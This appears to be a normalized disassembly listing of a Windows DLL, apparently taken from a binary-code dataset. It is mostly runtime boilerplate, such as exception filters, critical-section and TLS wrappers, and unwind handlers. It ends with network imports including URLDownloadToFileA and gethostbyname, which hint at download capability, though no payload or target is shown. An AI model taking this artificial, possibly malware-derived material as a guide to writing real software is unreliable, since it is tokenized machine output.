call sub_1000ed24
and [ ebp - 0x4 ] 0x0
movapd xmm0 xmm1
mov [ ebp - 0x1c ] 0x1
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
sub_10011e25
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_10011eba
call sub_10011e58
mov [ rw-data ] eax
xor eax eax
retn
sub_1001200d
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
push [ eax * 8 + rw-data ]
call [ LeaveCriticalSection@IAT ]
pop ebp
retn
sub_100120de
push 0xa
call sub_1001200d
pop ecx
retn
sub_10012c62
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
call sub_10012c37
pop ecx
push [ ebp + 0x8 ]
call [ ExitProcess@IAT ]
sub_10012c7a
push 0x8
call sub_100120e7
pop ecx
retn
sub_10012c83
push 0x8
call sub_1001200d
pop ecx
retn
sub_10012e69
cmp [ ebp + 0x10 ] 0x0
je r-xdata
retn
push 0x8
call sub_1001200d
pop ecx
sub_10012e7e
mov edi edi
push ebp
mov ebp esp
push 0x0
push 0x1
push [ ebp + 0x8 ]
call sub_10012d52
add esp 0xc
pop ebp
retn
sub_10012e94
push 0x1
push 0x0
push 0x0
call sub_10012d52
add esp 0xc
retn
sub_1001313c
push 0xe
call sub_1001200d
pop ecx
retn
sub_10013499
push 0xd
call sub_1001200d
pop ecx
retn
sub_10013864
push 0xd
call sub_1001200d
pop ecx
retn
sub_1001389d
cmp [ rw-data ] 0x0
jne r-xdata
xor eax eax
retn
push 0xfffffffd
call sub_10013703
pop ecx
mov [ rw-data ] 0x1
sub_10013bd4
push 0xc
call sub_1001200d
pop ecx
mov esi [ ebp - 0x1c ]
retn
sub_10013c52
push 0x0
call sub_10013be0
pop ecx
retn
sub_10013ccd
call [ TlsAlloc@IAT ]
retn 0x4
sub_10013cd6
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0x8 ]
push [ rw-data ]
call [ TlsGetValue@IAT ]
call eax
pop ebp
retn 0x4
sub_10013cf0
mov eax [ rw-data ]
retn
sub_10013d2a
mov edi edi
push ebp
mov ebp esp
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
push [ rw-data ]
call sub_10013c5b
pop ecx
call eax
pop ebp
retn 0x8
sub_10013e59
push 0xd
call sub_1001200d
pop ecx
retn
sub_10013e62
push 0xc
call sub_1001200d
pop ecx
retn
sub_10014018
push 0xd
call sub_1001200d
pop ecx
retn
sub_10014024
push 0xc
call sub_1001200d
pop ecx
retn
sub_100158cb
mov eax [ ebp - 0x14 ]
mov ecx [ eax ]
mov eax [ ecx ]
xor edx edx
cmp eax 0xc0000005
sete dl
mov eax edx
retn
sub_10015bae
and [ rw-data ] 0x0
retn
sub_10015d2f
retn
sub_10015d30
mov eax sub_1001a96d
mov [ rw-data ] eax
mov [ rw-data ] sub_1001a054
mov [ rw-data ] sub_1001a008
mov [ rw-data ] sub_1001a041
mov [ rw-data ] sub_10019faa
mov [ rw-data ] eax
mov [ rw-data ] sub_1001a8e5
mov [ rw-data ] sub_10019fc6
mov [ rw-data ] sub_10019f28
mov [ rw-data ] sub_10019eb5
retn
sub_10015d90
mov edi edi
push ebp
mov ebp esp
call sub_10015d30
call sub_1001a9f9
cmp [ ebp + 0x8 ] 0x0
mov [ rw-data ] eax
je r-xdata
fnclex
pop ebp
retn
call sub_1001a990
sub_10016a64
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10016a94
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
mov [ ebp - 0x20 ] eax
xor ecx ecx
cmp eax 0xc0000017
sete cl
mov eax ecx
retn
sub_10016aab
mov esp [ ebp - 0x18 ]
cmp [ ebp - 0x20 ] 0xc0000017
jne r-xdata
and [ ebp - 0x1c ] 0x0
mov [ ebp - 0x4 ] 0xfffffffe
mov eax [ ebp - 0x1c ]
call sub_1000ed69
retn
push 0x8
call [ SetLastError@IAT ]
sub_10016b69
push 0x1
call sub_1001200d
pop ecx
retn
sub_100175a8
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_1001737d
add esp 0x10
pop ebp
retn
sub_1001772c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_100175c2
add esp 0x10
pop ebp
retn
sub_10017831
xor eax eax
mov ecx [ fs : 0x0 ]
cmp [ ecx + 0x4 ] sub_10017768
jne r-xdata
retn
mov edx [ ecx + 0xc ]
mov edx [ edx + 0xc ]
cmp [ ecx + 0x8 ] edx
jne r-xdata
mov eax 0x1
sub_1001787c
call eax
retn
sub_10017a5c
push [ ebp + 0x8 ]
call sub_1000e6e5
pop ecx
retn
sub_10017d8c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017c75
add esp 0x10
pop ebp
retn
sub_10017dde
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10017da6
pop ecx
pop ecx
pop ebp
retn
sub_10017f02
push [ ebp + 0x8 ]
call sub_1000e6e5
pop ecx
retn
sub_10017fa6
push 0x4
call sub_1001200d
pop ecx
retn
sub_1001813c
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x14 ]
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10017fd0
add esp 0x14
pop ebp
retn
sub_100181f5
push 0x8
push r--data
call sub_1000ed24
call sub_10013ee4
mov eax [ eax + 0x78 ]
test eax eax
je r-xdata
call sub_1001afe5
and [ ebp - 0x4 ] 0x0
call eax
jmp r-xdata
mov [ ebp - 0x4 ] 0xfffffffe
sub_10018215
xor eax eax
inc eax
retn
sub_1001822e
call sub_10013ee4
mov eax [ eax + 0x7c ]
test eax eax
je r-xdata
jmp sub_100181f5
call eax
sub_10018265
xor eax eax
inc eax
retn
sub_10018279
push sub_100181f5
call sub_10013be0
pop ecx
mov [ rw-data ] eax
retn
sub_1001828a
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
mov [ rw-data ] eax
pop ebp
retn
sub_100182df
push [ rw-data ]
call sub_10013c5b
pop ecx
retn
sub_10018460
cmp [ ebp - 0x1c ] 0x0
je r-xdata
retn
push 0x0
call sub_1001200d
pop ecx
sub_1001849c
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_100184ab
mov edi edi
push ebp
mov ebp esp
mov eax [ ebp + 0x8 ]
mov [ rw-data ] eax
pop ebp
retn
sub_10019390
push 0x4
call sub_1001200d
pop ecx
retn
sub_1001a008
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x10 ]
push [ ebp + 0xc ]
push [ ebp + 0x8 ]
call sub_10019fc6
add esp 0x10
pop ebp
retn
sub_1001a041
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10019eb5
pop ecx
pop ecx
pop ebp
retn
sub_1001a054
mov edi edi
push ebp
mov ebp esp
push 0x0
push [ ebp + 0x8 ]
call sub_10019f28
pop ecx
pop ecx
pop ebp
retn
sub_1001ac43
mov edi edi
push ebp
mov ebp esp
push 0x4
push 0x0
push [ ebp + 0x8 ]
push 0x0
call sub_1001abf0
add esp 0x10
pop ebp
retn
sub_1001af06
xor eax eax
push eax
push eax
push 0x3
push eax
push 0x3
push 0x40000000
push r--data
call [ CreateFileA@IAT ]
mov [ rw-data ] eax
retn
sub_1001afdc
push 0x2
call sub_10012c0e
pop ecx
retn
sub_1001b300
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0xf
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10017e00
sub_1001b316
push ecx
lea ecx [ esp + 0x8 ]
sub ecx eax
and ecx 0x7
add eax ecx
sbb ecx ecx
or eax ecx
pop ecx
jmp sub_10017e00
sub_1001c5f7
mov eax [ ebp - 0x14 ]
mov eax [ eax ]
mov eax [ eax ]
cmp eax 0xc0000005
je r-xdata
xor eax eax
inc eax
retn
cmp eax 0xc000001d
je r-xdata
xor eax eax
retn
sub_1001c640
lea eax [ edx - 0x1 ]
pop ebx
retn
gethostbyname
jmp [ gethostbyname@IAT ]
WSAGetLastError
jmp [ WSAGetLastError@IAT ]
inet_addr
jmp [ inet_addr@IAT ]
WSAStartup
jmp [ WSAStartup@IAT ]
inet_ntoa
jmp [ inet_ntoa@IAT ]
gethostname
jmp [ gethostname@IAT ]
URLDownloadToFileA
jmp [ URLDownloadToFileA@IAT ]
RtlUnwind
jmp [ RtlUnwind@IAT ]
sub_1001cece
mov [ ecx ] r--data
jmp sub_1000d45c
sub_1001d02a
push [ ebp - 0x14 ]
call sub_1001cf5f
pop ecx
retn
sub_1001d06e
call sub_10013ee4
cmp [ eax + 0x90 ] 0x0
jle r-xdata
retn
call sub_10013ee4
add eax 0x90
dec [ eax ]
sub_1001d111
xor eax eax
cmp [ ebp + 0xc ] al
setne al
retn
sub_1001d11a
mov esp [ ebp - 0x18 ]
call sub_100181f5
sub_1001d1c7
push 0x4
mov eax sub_1001dc53
call sub_1001cdc5
call sub_10013ee4
cmp [ eax + 0x94 ] 0x0
je r-xdata
and [ ebp - 0x4 ] 0x0
call sub_1001822e
call sub_10018241
sub_1001d2a0
mov eax [ ebp - 0x14 ]
call sub_1001d089
retn
sub_1001d517
xor eax eax
inc eax
retn
sub_1001d51b
mov esp [ ebp - 0x18 ]
call sub_100181f5
sub_1001d5b0
xor eax eax
inc eax
retn
sub_1001d5b4
mov esp [ ebp - 0x18 ]
call sub_100181f5
sub_1001da66
mov edi edi
push ebp
mov ebp esp
push esi
push [ ebp + 0x8 ]
mov esi ecx
call sub_1000d3ff
mov [ esi ] r--data
mov eax esi
pop esi
pop ebp
retn 0x4
sub_1001dc13
mov edi edi
push ebp
mov ebp esp
xor eax eax
inc eax
cmp [ ebp + 0x8 ] 0x0
jne r-xdata
pop ebp
retn
xor eax eax
sub_1001dc30
lea ecx [ ebp - 0x28 ]
jmp sub_10008b60
sub_1001dc38
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dc53
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dc70
mov ecx [ ebp + 0x4 ]
jmp sub_10008b60
sub_1001dc78
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dca0
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x2c ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dcc0
mov eax [ ebp + 0x4 ]
jmp sub_10008ec0
sub_1001dcc8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4 ]
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dcf0
mov ecx [ ebp - 0x10 ]
jmp sub_1000d45c
sub_1001dcf8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dd20
mov ecx [ ebp - 0x10 ]
jmp sub_1000d45c
sub_1001dd28
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
j_sub_100023c0
jmp sub_100023c0
sub_1001dd55
mov edx [ esp + 0x8 ]
lea eax [ edx + 0xc ]
mov ecx [ edx - 0x18 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dd70
lea ecx [ ebp - 0x28 ]
jmp sub_10008b60
sub_1001dd78
mov eax [ ebp - 0x2c ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x2c ] 0xfffffffe
mov ecx [ ebp + 0x4 ]
jmp sub_10008b60
sub_1001dd91
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001ddb0
lea ecx [ ebp - 0x48 ]
jmp sub_10008b60
sub_1001ddb8
lea ecx [ ebp - 0x64 ]
jmp sub_10008b60
sub_1001ddc0
lea ecx [ ebp - 0x2c ]
jmp sub_10008b60
sub_1001ddc8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x6c ]
mov ecx [ edx - 0x70 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001ddf0
lea ecx [ ebp - 0x2c ]
jmp sub_10008b60
sub_1001ddf8
mov eax [ ebp - 0x34 ]
and eax 0x1
je r-xdata
retn
and [ ebp - 0x34 ] 0xfffffffe
mov ecx [ ebp - 0x30 ]
jmp sub_10008b60
sub_1001de11
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x34 ]
mov ecx [ edx - 0x38 ]
xor ecx eax
call sub_1000c0a5
add eax 0x8
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001de40
lea ecx [ ebp - 0x50 ]
jmp sub_10008b60
sub_1001de48
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x54 ]
mov ecx [ edx - 0x58 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001de70
lea eax [ ebp - 0x38 ]
jmp sub_1000a300
sub_1001de78
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x40 ]
mov ecx [ edx - 0x44 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dea0
mov eax [ ebp + 0x4 ]
jmp sub_10008ec0
sub_1001dea8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8 ]
mov ecx [ edx - 0xc ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001ded0
lea eax [ ebp - 0x122c ]
push eax
call sub_100040a0
retn
sub_1001dedd
lea ecx [ ebp - 0x1158 ]
jmp sub_10008b60
sub_1001dee8
lea ecx [ ebp - 0x113c ]
jmp sub_10008b60
sub_1001def3
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001defe
lea eax [ ebp - 0x11ac ]
push eax
call sub_10004100
retn
sub_1001df0b
lea eax [ ebp - 0x11fc ]
push eax
call sub_10004100
retn
sub_1001df18
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001df23
lea eax [ ebp - 0x11ac ]
push eax
call sub_10004100
retn
sub_1001df30
lea eax [ ebp - 0x11fc ]
push eax
call sub_10004100
retn
sub_1001df3d
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001df48
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001df53
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001df5e
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001df69
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001df74
lea ecx [ ebp - 0x1174 ]
jmp sub_10008b60
sub_1001df7f
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x123c ]
mov ecx [ edx - 0x1240 ]
xor ecx eax
call sub_1000c0a5
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dfb0
lea ecx [ ebp - 0x48 ]
jmp sub_10008b60
sub_1001dfb8
lea ecx [ ebp - 0x2c ]
jmp sub_10008b60
sub_1001dfc0
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x50 ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_1000c0a5
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001dff0
lea eax [ ebp - 0x44 ]
push eax
call sub_10004100
retn
sub_1001dffa
lea eax [ ebp - 0x7c ]
push eax
call sub_10004100
retn
sub_1001e004
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x94 ]
mov ecx [ edx - 0x98 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e030
lea ecx [ ebp - 0x2c ]
jmp sub_10008b60
sub_1001e038
lea ecx [ ebp - 0x48 ]
jmp sub_10008b60
sub_1001e040
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x50 ]
mov ecx [ edx - 0x54 ]
xor ecx eax
call sub_1000c0a5
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e070
mov ecx [ ebp + 0x4 ]
jmp sub_10008b60
sub_1001e078
mov eax [ ebp - 0x10 ]
jmp sub_10008ec0
sub_1001e080
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10 ]
mov ecx [ edx - 0x14 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e0a0
mov ecx [ ebp + 0x4 ]
jmp sub_10008b60
sub_1001e0a8
mov eax [ ebp + 0x4 ]
add eax 0x1c
push eax
call sub_100040a0
retn
sub_1001e0b5
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xc ]
mov ecx [ edx - 0x10 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e0d0
lea ecx [ ebp - 0x464 ]
jmp sub_10008b60
sub_1001e0db
lea ecx [ ebp - 0x42c ]
jmp sub_10008b60
sub_1001e0e6
lea ecx [ ebp - 0x448 ]
jmp sub_10008b60
sub_1001e0f1
lea ecx [ ebp - 0x448 ]
jmp sub_10008b60
sub_1001e0fc
lea ecx [ ebp - 0x480 ]
jmp sub_10008b60
sub_1001e107
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x490 ]
mov ecx [ edx - 0x494 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e140
lea ecx [ ebp - 0x474 ]
jmp sub_10008b60
sub_1001e14b
lea ecx [ ebp - 0x458 ]
jmp sub_10008b60
sub_1001e156
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x47c ]
mov ecx [ edx - 0x480 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e190
lea eax [ ebp - 0x14c ]
push eax
call sub_1000aa40
retn
sub_1001e19d
lea ecx [ ebp - 0x168 ]
jmp sub_10008b60
sub_1001e1a8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x16c ]
mov ecx [ edx - 0x170 ]
xor ecx eax
call sub_1000c0a5
add eax 0xc
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e1e0
lea ecx [ ebp - 0x2c ]
jmp sub_10008b60
sub_1001e1e8
lea ecx [ ebp - 0x48 ]
jmp sub_10008b60
sub_1001e1f0
lea ecx [ ebp - 0x64 ]
jmp sub_10008b60
sub_1001e1f8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x74 ]
mov ecx [ edx - 0x78 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e220
lea ecx [ ebp - 0x12c ]
jmp sub_10008b60
sub_1001e22b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x130 ]
mov ecx [ edx - 0x134 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e260
lea ecx [ ebp - 0x854 ]
jmp sub_10008b60
sub_1001e26b
lea ecx [ ebp - 0x854 ]
jmp sub_10008b60
sub_1001e276
lea ecx [ ebp - 0x854 ]
jmp sub_10008b60
sub_1001e281
lea ecx [ ebp - 0x838 ]
jmp sub_10008b60
sub_1001e28c
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x8b0 ]
mov ecx [ edx - 0x8b4 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e2c0
lea ecx [ ebp - 0xe4c ]
jmp sub_10008b60
sub_1001e2cb
lea ecx [ ebp - 0xe30 ]
jmp sub_10008b60
sub_1001e2d6
mov edx [ esp + 0x8 ]
lea eax [ edx - 0xea8 ]
mov ecx [ edx - 0xeac ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e310
lea ecx [ ebp - 0x12c ]
jmp sub_10008b60
sub_1001e31b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x128 ]
mov ecx [ edx - 0x12c ]
xor ecx eax
call sub_1000c0a5
add eax 0x8
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e350
lea ecx [ ebp - 0x92c ]
jmp sub_10008b60
sub_1001e35b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x934 ]
mov ecx [ edx - 0x938 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e390
lea ecx [ ebp - 0x45c ]
jmp sub_10008b60
sub_1001e39b
lea ecx [ ebp - 0x45c ]
jmp sub_10008b60
sub_1001e3a6
lea ecx [ ebp - 0x440 ]
jmp sub_10008b60
sub_1001e3b1
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x4c8 ]
mov ecx [ edx - 0x4cc ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e3e0
lea ecx [ ebp - 0x73c ]
jmp sub_10008b60
sub_1001e3eb
lea ecx [ ebp - 0x790 ]
jmp sub_10008b60
sub_1001e3f6
lea ecx [ ebp - 0x73c ]
jmp sub_10008b60
sub_1001e401
lea ecx [ ebp - 0x790 ]
jmp sub_10008b60
sub_1001e40c
lea ecx [ ebp - 0x758 ]
jmp sub_10008b60
sub_1001e417
lea ecx [ ebp - 0x774 ]
jmp sub_10008b60
sub_1001e422
lea ecx [ ebp - 0x7ac ]
jmp sub_10008b60
sub_1001e42d
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7bc ]
mov ecx [ edx - 0x7c0 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e460
lea ecx [ ebp - 0x784 ]
jmp sub_10008b60
sub_1001e46b
lea ecx [ ebp - 0x7bc ]
jmp sub_10008b60
sub_1001e476
lea ecx [ ebp - 0x784 ]
jmp sub_10008b60
sub_1001e481
lea ecx [ ebp - 0x7bc ]
jmp sub_10008b60
sub_1001e48c
lea ecx [ ebp - 0x784 ]
jmp sub_10008b60
sub_1001e497
lea ecx [ ebp - 0x7bc ]
jmp sub_10008b60
sub_1001e4a2
lea ecx [ ebp - 0x768 ]
jmp sub_10008b60
sub_1001e4ad
lea ecx [ ebp - 0x7a0 ]
jmp sub_10008b60
sub_1001e4b8
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x7cc ]
mov ecx [ edx - 0x7d0 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e4f0
lea eax [ ebp - 0x148 ]
jmp sub_1000a300
sub_1001e4fb
lea ecx [ ebp - 0x140 ]
jmp sub_10008b60
sub_1001e506
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x150 ]
mov ecx [ edx - 0x154 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e540
lea ecx [ ebp - 0x82c ]
jmp sub_10008b60
sub_1001e54b
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x82c ]
mov ecx [ edx - 0x830 ]
xor ecx eax
call sub_1000c0a5
add eax 0x8
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e580
lea ecx [ ebp - 0x2c ]
jmp sub_10008b60
sub_1001e588
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x2c ]
mov ecx [ edx - 0x30 ]
xor ecx eax
call sub_1000c0a5
add eax 0x8
mov ecx [ edx - 0x4 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e5b0
lea ecx [ ebp - 0x8294 ]
jmp sub_10008b60
sub_1001e5bb
lea ecx [ ebp - 0x8294 ]
jmp sub_10008b60
sub_1001e5c6
lea ecx [ ebp - 0x10668 ]
jmp sub_10008b60
sub_1001e5d1
lea ecx [ ebp - 0x10668 ]
jmp sub_10008b60
sub_1001e5dc
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x10690 ]
mov ecx [ edx - 0x10694 ]
xor ecx eax
call sub_1000c0a5
add eax 0x10
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e610
lea esi [ ebp - 0x14238 ]
jmp sub_1000bad0
sub_1001e61b
lea eax [ ebp - 0x14274 ]
push eax
call sub_1000aa40
retn
sub_1001e628
mov edx [ esp + 0x8 ]
lea eax [ edx - 0x14274 ]
mov ecx [ edx - 0x14278 ]
xor ecx eax
call sub_1000c0a5
add eax 0xc
mov ecx [ edx - 0x8 ]
xor ecx eax
call sub_1000c0a5
mov eax r--data
jmp sub_1001ca39
sub_1001e656
mov [ rw-data ] r--data
mov ecx rw-data
jmp sub_1000d45c
